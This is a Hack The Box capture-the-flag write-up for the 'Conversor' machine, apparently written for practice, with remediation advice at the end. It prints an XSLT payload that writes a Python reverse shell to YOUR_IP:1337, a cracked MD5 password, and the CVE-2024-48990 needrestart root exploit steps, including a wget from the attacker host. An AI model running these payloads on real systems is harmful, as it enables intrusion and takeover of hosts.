# Conversor HTB - Writeup

## Machine Information
- **Target:** conversor.htb
- **Difficulty:** Medium
- **Attack Vector:** XSLT Injection → CVE-2024-48990
- **OS:** Linux (Ubuntu 24)

---

## Attack Chain Overview

1. Initial Reconnaissance (nmap, gobuster)
2. XSLT Injection Exploitation
3. Initial Shell via Cron Job
4. Privilege Escalation to User (Hash Cracking)
5. Privilege Escalation to Root (CVE-2024-48990)

---

## Phase 1: Reconnaissance

### Port Scanning
```bash
nmap -sC -sV -oN nmap.txt conversor.htb
```

**Key findings:** Web server running on port 80/443

### Directory Enumeration
```bash
gobuster dir -u http://conversor.htb -w /path/to/wordlist
```

**Discovered:** Flask application with XML/XSLT converter functionality

---

## Phase 2: XSLT Injection Exploitation

### Vulnerability Analysis

The application accepts two file uploads: XML and XSLT files for conversion. Code analysis reveals:

```python
parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
xml_tree = etree.parse(xml_path, parser)
xslt_tree = etree.parse(xslt_path)  # No security restrictions!
```

**Critical Finding:** The XSLT parser has no security restrictions, allowing us to use EXSLT extensions.

### Cron Job Discovery

From the install documentation:
```bash
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```

This cron job executes all Python files in the scripts directory every minute as www-data.

### Exploitation Strategy

1. Use `exsl:document` to write a Python reverse shell to `/var/www/conversor.htb/scripts/`
2. Wait for cron job to execute our malicious Python script
3. Receive reverse shell as www-data

### Payload Creation

#### 1. Create test.xml
```xml
<?xml version="1.0"?>
<root></root>
```

#### 2. Create shell.xslt
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exsl="http://exslt.org/common"
  extension-element-prefixes="exsl">
  
  <xsl:output method="text"/>
  
  <xsl:template match="/">
    <exsl:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("YOUR_IP",1337))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
    </exsl:document>
  </xsl:template>
</xsl:stylesheet>
```

### Exploitation Steps

1. Start netcat listener:
```bash
nc -lvnp 1337
```

2. Upload `test.xml` and `shell.xslt` to the web application

3. Wait up to 60 seconds for the cron job to execute

4. **Result:** Shell obtained as www-data

---

## Phase 3: Privilege Escalation to User

### Database Enumeration

The Flask application uses SQLite to store user credentials:

```bash
sqlite3 /var/www/conversor.htb/instance/users.db "SELECT * FROM users;"
```

**Output:**
```
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|admin|3d801aa532c1cec3ee82d87a99fdf63f
```

### Hash Cracking

The passwords are hashed with MD5 (weak hashing algorithm). Use an online MD5 cracker or hashcat:

- **Hash:** `5b5c3ac3a1c897c94caad48e6c71fdec`
- **Password:** `Keepmesafeandwarm`

### Switch User

```bash
su fismathack
# Password: Keepmesafeandwarm

cat ~/user.txt
```

**Result:** User flag obtained ✅

---

## Phase 4: Root Privilege Escalation

### Sudo Enumeration

```bash
sudo -l
```

**Output:**
```
User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

### CVE-2024-48990 Exploitation

Needrestart 3.7 is vulnerable to CVE-2024-48990, allowing local privilege escalation.

**Check version:**
```bash
needrestart -V
# needrestart 3.7
```

### Exploit Steps

#### 1. Clone the exploit repository on attack machine:
```bash
git clone https://github.com/ten-ops/CVE-2024-48990.git
cd CVE-2024-48990
```

#### 2. Compile the exploit:
```bash
make lib
```

This creates `/tmp/attacker/importlib/__init__.so` (malicious shared object)

#### 3. Transfer the exploit to the target:

**On attack machine:**
```bash
cd /tmp
tar -czf attacker.tar.gz attacker/
python3 -m http.server 8000
```

**On target machine:**
```bash
cd /tmp
wget http://YOUR_IP:8000/attacker.tar.gz
tar -xzf attacker.tar.gz
```

#### 4. Create and run the trigger script:
```bash
cd /tmp/attacker
cat << 'EOF' > subprocess.py
import time
while True:
    try:
        import importlib
    except:
        pass
    if __import__("os").path.exists("/tmp/poc"):
        print("Root obtained!, clear traces ...")
        __import__("os").system("/tmp/poc -p")
        break
    time.sleep(1)
EOF

PYTHONPATH="$PWD" python3 subprocess.py 2>/dev/null &
```

#### 5. Trigger the exploit:
```bash
sudo needrestart -r a
```

#### 6. Execute the SUID bash:
```bash
/tmp/poc -p
```

#### 7. Get root flag:
```bash
cat /root/root.txt
```

**Result:** ROOT FLAG OBTAINED! 🎉

---

## Key Takeaways & Lessons Learned

### Security Vulnerabilities Exploited

- **XSLT Injection:** Lack of security restrictions on XSLT parser allowed arbitrary file writing via `exsl:document`
- **Weak Password Hashing:** MD5 hashing without salt is easily crackable
- **Dangerous Cron Jobs:** Automatic execution of user-writable scripts creates attack vector
- **Sudo Misconfiguration:** Allowing unprivileged users to run vulnerable binaries with sudo

### Penetration Testing Methodology

1. **Reconnaissance:** Always thoroughly enumerate web applications and their functionality
2. **Code Review:** When source code is available, analyze it for security flaws
3. **Credential Hunting:** Look for databases, configuration files, and other sources of credentials
4. **Privilege Escalation:** Check sudo permissions, SUID binaries, and running services for known CVEs

### Tools & Techniques Used

- `nmap` - Port scanning and service enumeration
- `gobuster` - Directory and file discovery
- EXSLT Extensions - `exsl:document` for arbitrary file writing
- `sqlite3` - Database enumeration
- MD5 Hash Cracking - Online crackers or hashcat
- CVE-2024-48990 - Needrestart privilege escalation exploit

---

## Remediation Recommendations

- **XSLT Processing:** Apply same security restrictions to XSLT parser as XML parser (`no_network`, `resolve_entities=False`)
- **Password Hashing:** Use bcrypt or Argon2 instead of MD5 for password storage
- **Cron Jobs:** Never execute files from user-writable directories
- **File Upload Validation:** Validate and sanitize all uploaded content
- **Sudo Configuration:** Regularly audit sudo permissions and keep system packages updated
- **Patch Management:** Update needrestart to version 3.8+ to address CVE-2024-48990

---

## Commands Used

### Reconnaissance
```bash
nmap -sC -sV -oN nmap.txt conversor.htb
gobuster dir -u http://conversor.htb -w /path/to/wordlist
```

### Initial Access
```bash
nc -lvnp 1337
# Upload XML and XSLT files via web interface
```

### Database Enumeration
```bash
sqlite3 /var/www/conversor.htb/instance/users.db "SELECT * FROM users;"
```

### User Escalation
```bash
su fismathack
cat ~/user.txt
```

### Root Escalation
```bash
sudo -l
needrestart -V
git clone https://github.com/ten-ops/CVE-2024-48990.git
make lib
tar -czf attacker.tar.gz attacker/
wget http://YOUR_IP:8000/attacker.tar.gz
tar -xzf attacker.tar.gz
PYTHONPATH="$PWD" python3 subprocess.py 2>/dev/null &
sudo needrestart -r a
/tmp/poc -p
cat /root/root.txt
```

---

## Tags
#htb #linux #xslt-injection #cve-2024-48990 #needrestart #privilege-escalation #hash-cracking #md5 #flask #sqlite #exslt #cron-job

---

## References
- [CVE-2024-48990 Exploit](https://github.com/ten-ops/CVE-2024-48990)
- [EXSLT Documentation](http://exslt.org/)
- [OWASP XSLT Injection](https://owasp.org/www-community/vulnerabilities/XSLT_Injection)
